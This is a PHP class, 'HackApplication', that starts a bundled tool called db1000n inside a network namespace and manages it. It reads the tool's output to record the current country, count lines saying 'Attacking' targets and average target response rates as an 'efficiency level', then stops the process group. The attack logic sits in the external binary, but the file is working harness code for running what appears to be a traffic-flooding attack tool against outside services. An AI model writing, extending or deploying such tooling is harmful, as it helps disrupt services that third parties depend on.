<?php

class HackApplication
{
    private $log = '',
            $instantLog = false,
            $readHackApplicationOutput = false,
            $process,
            $processPGid,
            $pipes,
            $wasLaunched = false,
            $launchFailed = false,
            $currentCountry,
            $efficiencyLevels = [];

    public function processLaunch($netnsName)
    {
        if ($this->launchFailed) {
            return -1;
        }

        if ($this->wasLaunched) {
            return true;
        }

        $command = "ip netns exec $netnsName  " . __DIR__ . "/bin/db1000n  2>&1";
        $this->log($command);
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "a") // stderr
        );
        $this->process = proc_open($command, $descriptorSpec, $this->pipes);
        if (! $this->isAlive()) {
            $this->log('Command failed: ' . $command);
            $this->launchFailed = true;
            return -1;
        }
        $this->changePGid();
        $this->log(debugPosix($this->process));
        stream_set_blocking($this->pipes[1], false);
        $this->wasLaunched = true;
        return true;
    }

    private function log($message, $noLineEnd = false)
    {
        $message .= $noLineEnd  ?  '' : "\n";
        $this->log .= $message;
        if ($this->instantLog) {
            echo $message;
        }
    }

    public function clearLog()
    {
        $this->log = '';
    }

    public function setReadHackApplicationOutput($state)
    {
        $this->readHackApplicationOutput = $state;
    }

    public function getLog() : string
    {
        $ret = $this->log;

        if (! $this->readHackApplicationOutput) {
            return $ret;
        }

        //------------------- read db1000n stdout -------------------

        $output = streamReadLines($this->pipes[1], 0.1);

        //------------------- fetch country from db1000n output -------------------

        $countryRegexp = <<<REGEXP
             #Current country:([^\(]+)#
        REGEXP;

        if (preg_match(trim($countryRegexp), $output, $matches) === 1) {
            $currentCountry = $matches[1];
            if ($currentCountry) {
                $this->currentCountry = trim($currentCountry);
            }
        }

        //------------------- fetch statistics from db1000n output -------------------

        $responseRateRegExp = <<<PhpRegExp
            #Response rate.*?([\d\.]+).*?$#um
            PhpRegExp;
        if (preg_match_all(trim($responseRateRegExp), $output, $matches) > 0) {
            foreach ($matches[1] as $rateStr) {
                $this->efficiencyLevels[] = (float) $rateStr;
            }
        }

        //------------------- reduce db1000n output -------------------
        global $REDUCE_DB1000N_OUTPUT;

        if ($REDUCE_DB1000N_OUTPUT) {

            // Remove timestamps
            $timeStampRegexp = <<<PhpRegExp
                  #^\d{4}\/\d{1,2}\/\d{1,2}\s+\d{1,2}:\d{1,2}:\d+\.\d{1,6}\s+#um  
                  PhpRegExp;
            $output = preg_replace(trim($timeStampRegexp), '', $output);

            // Split lines
            $linesArray = mbSplitLines($output);

            // Remove empty lines
            $linesArray = mbRemoveEmptyLinesFromArray($linesArray);

            $attackingMessages = [];
            $i = 0;
            while ($line = $linesArray[$i] ?? false) {

                if (strpos($line, ': Attacking ') !== false) {
                    // Collect "Attacking" messages
                    $count = $attackingMessages[$line] ?? 0;
                    $count++;
                    $attackingMessages[$line] = $count;
                } else {
                    $sameLinesCount = 1;
                    $ni = $i + 1;
                    while ($nextLine = $linesArray[$ni] ?? false) {
                        if ($line === $nextLine) {
                            $sameLinesCount++;
                            $ni++;
                        } else {
                            break;
                        }
                    }
                    $i = $ni - 1;

                    $this->addCountToLine($line, $sameLinesCount);
                    $ret .= $line . "\n";
                }

                $i++;
            }

            // Show collected "Attacking" targets
            ksort($attackingMessages);
            foreach ($attackingMessages as $line => $count) {
                $this->addCountToLine($line, $count);
                $ret .= $line . "\n";
            }

        } else {
            $ret .= $output;
        }

        //--------------------------------

        return $ret;
    }

    private function addCountToLine(&$line, $count)
    {
        global $LOG_WIDTH;
        if ($count > 1) {
            $messagesCountLabel = "    [$count]";
            $line = str_pad($line, $LOG_WIDTH - strlen($messagesCountLabel) + 1);
            $line .= $messagesCountLabel;
        }
    }

    // Should be called after getLog()
    public function getCurrentCountry()
    {
        return $this->currentCountry;
    }

    // Should be called after getLog()
    public function getEfficiencyLevel()
    {
        if (count($this->efficiencyLevels) === 0) {
            return null;
        }
        return round(array_sum($this->efficiencyLevels) / count($this->efficiencyLevels));
    }

    private function changePGid()
    {
        $processStatus = proc_get_status($this->process);
        $pid = $processStatus['pid'];
        posix_setpgid($pid, $pid);
        $this->processPGid = posix_getpgid($pid);
    }

    public function isAlive()
    {
        if (! is_resource($this->process)) {
            return false;
        }

        $processStatus = proc_get_status($this->process);
        return $processStatus['running'];
    }

    // Only first call of this function return real value, next calls return -1
    public function getExitCode()
    {
        $processStatus = proc_get_status($this->process);
        return $processStatus['exitcode'];
    }

    public function terminate($hasError = false)
    {
        global $LOG_BADGE_WIDTH;
        $this->log(str_repeat(' ', $LOG_BADGE_WIDTH + 3) . "db1000n SIGTERM PGID -{$this->processPGid}");
        posix_kill(0 - $this->processPGid, SIGTERM);
    }

    public function getProcess()
    {
        return $this->process;
    }

}